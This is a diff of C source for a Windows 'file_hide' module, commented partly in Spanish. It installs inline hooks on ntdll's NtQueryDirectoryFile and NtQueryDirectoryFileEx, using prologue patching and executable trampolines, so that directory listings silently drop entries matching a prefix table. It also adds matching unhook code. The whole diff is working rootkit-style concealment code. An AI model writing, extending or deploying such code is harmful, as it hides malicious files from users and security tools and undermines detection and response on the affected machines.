@@ -16,12 +16,20 @@ typedef NTSTATUS (NTAPI *pNtQueryDirectoryFile)(
     HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK,
     PVOID, ULONG, ULONG, BOOLEAN, PUNICODE_STRING, BOOLEAN);
 
+typedef NTSTATUS (NTAPI *pNtQueryDirectoryFileEx)(
+    HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK,
+    PVOID, ULONG, ULONG, ULONG, PUNICODE_STRING);
+
 /* --- Estado del hook ---------------------------------------------------- */
 
 static PrefixTable           *g_table      = NULL;
 static pNtQueryDirectoryFile  g_original   = NULL;
 static pNtQueryDirectoryFile  g_trampoline = NULL;
 static BYTE                   g_saved[PATCH_SIZE];
+
+static pNtQueryDirectoryFileEx  g_original_ex   = NULL;
+static pNtQueryDirectoryFileEx  g_trampoline_ex = NULL;
+static BYTE                     g_saved_ex[PATCH_SIZE];
 
 /* --- Helpers para extraer FileName de cada struct ----------------------- */
 
@@ -55,20 +63,11 @@ static void set_next_offset(BYTE *entry, ULONG info_class, ULONG val)
     *(ULONG *)entry = val;
 }
 
-/* --- Hook function ------------------------------------------------------ */
+/* --- Shared filtering logic --------------------------------------------- */
 
-static NTSTATUS NTAPI HookedNtQueryDirectoryFile(
-    HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine,
-    PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock,
-    PVOID FileInformation, ULONG Length, ULONG FileInformationClass,
-    BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName,
-    BOOLEAN RestartScan)
+static NTSTATUS filter_entries(NTSTATUS status, PVOID FileInformation,
+                               ULONG Length, ULONG FileInformationClass)
 {
-    NTSTATUS status = g_trampoline(
-        FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
-        FileInformation, Length, FileInformationClass,
-        ReturnSingleEntry, FileName, RestartScan);
-
     if (status != 0)
         return status;
 
@@ -127,6 +126,37 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFile(
     return status;
 }
 
+/* --- Hook functions ----------------------------------------------------- */
+
+static NTSTATUS NTAPI HookedNtQueryDirectoryFile(
+    HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine,
+    PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock,
+    PVOID FileInformation, ULONG Length, ULONG FileInformationClass,
+    BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName,
+    BOOLEAN RestartScan)
+{
+    NTSTATUS status = g_trampoline(
+        FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
+        FileInformation, Length, FileInformationClass,
+        ReturnSingleEntry, FileName, RestartScan);
+
+    return filter_entries(status, FileInformation, Length, FileInformationClass);
+}
+
+static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(
+    HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine,
+    PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock,
+    PVOID FileInformation, ULONG Length, ULONG FileInformationClass,
+    ULONG QueryFlags, PUNICODE_STRING FileName)
+{
+    NTSTATUS status = g_trampoline_ex(
+        FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
+        FileInformation, Length, FileInformationClass,
+        QueryFlags, FileName);
+
+    return filter_entries(status, FileInformation, Length, FileInformationClass);
+}
+
 /* --- write_abs_jmp: mov rax, addr; jmp rax (12 bytes) ------------------ */
 
 static void write_abs_jmp(BYTE *buf, void *target)
@@ -176,25 +206,61 @@ int file_hide_install(PrefixTable *table)
     DWORD tmp;
     VirtualProtect((void *)g_original, PATCH_SIZE, oldProt, &tmp);
 
+    /* --- Hook NtQueryDirectoryFileEx (Windows 10 1709+) --- */
+    g_original_ex = (pNtQueryDirectoryFileEx)
+        GetProcAddress(ntdll, "NtQueryDirectoryFileEx");
+    if (g_original_ex) {
+        memcpy(g_saved_ex, (void *)g_original_ex, PATCH_SIZE);
+
+        g_trampoline_ex = (pNtQueryDirectoryFileEx)
+            VirtualAlloc(NULL, TRAMP_SIZE,
+                         MEM_COMMIT | MEM_RESERVE,
+                         PAGE_EXECUTE_READWRITE);
+        if (g_trampoline_ex) {
+            memcpy((void *)g_trampoline_ex, g_saved_ex, PATCH_SIZE);
+            write_abs_jmp((BYTE *)g_trampoline_ex + PATCH_SIZE,
+                          (BYTE *)g_original_ex + PATCH_SIZE);
+
+            if (VirtualProtect((void *)g_original_ex, PATCH_SIZE,
+                               PAGE_EXECUTE_READWRITE, &oldProt)) {
+                write_abs_jmp((BYTE *)g_original_ex,
+                              (void *)HookedNtQueryDirectoryFileEx);
+                VirtualProtect((void *)g_original_ex, PATCH_SIZE,
+                               oldProt, &tmp);
+            }
+        }
+    }
+
     return 0;
 }
 
 void file_hide_remove(void)
 {
-    if (!g_original) return;
+    if (g_original) {
+        DWORD oldProt;
+        if (VirtualProtect((void *)g_original, PATCH_SIZE,
+                           PAGE_EXECUTE_READWRITE, &oldProt)) {
+            memcpy((void *)g_original, g_saved, PATCH_SIZE);
+            DWORD tmp;
+            VirtualProtect((void *)g_original, PATCH_SIZE, oldProt, &tmp);
+        }
+        if (g_trampoline) {
+            VirtualFree((void *)g_trampoline, 0, MEM_RELEASE);
+            g_trampoline = NULL;
+        }
+    }
 
-    DWORD oldProt;
-    if (!VirtualProtect((void *)g_original, PATCH_SIZE,
-                        PAGE_EXECUTE_READWRITE, &oldProt))
-        return;
-
-    memcpy((void *)g_original, g_saved, PATCH_SIZE);
-
-    DWORD tmp;
-    VirtualProtect((void *)g_original, PATCH_SIZE, oldProt, &tmp);
-
-    if (g_trampoline) {
-        VirtualFree((void *)g_trampoline, 0, MEM_RELEASE);
-        g_trampoline = NULL;
+    if (g_original_ex) {
+        DWORD oldProt;
+        if (VirtualProtect((void *)g_original_ex, PATCH_SIZE,
+                           PAGE_EXECUTE_READWRITE, &oldProt)) {
+            memcpy((void *)g_original_ex, g_saved_ex, PATCH_SIZE);
+            DWORD tmp;
+            VirtualProtect((void *)g_original_ex, PATCH_SIZE, oldProt, &tmp);
+        }
+        if (g_trampoline_ex) {
+            VirtualFree((void *)g_trampoline_ex, 0, MEM_RELEASE);
+            g_trampoline_ex = NULL;
+        }
     }
 }
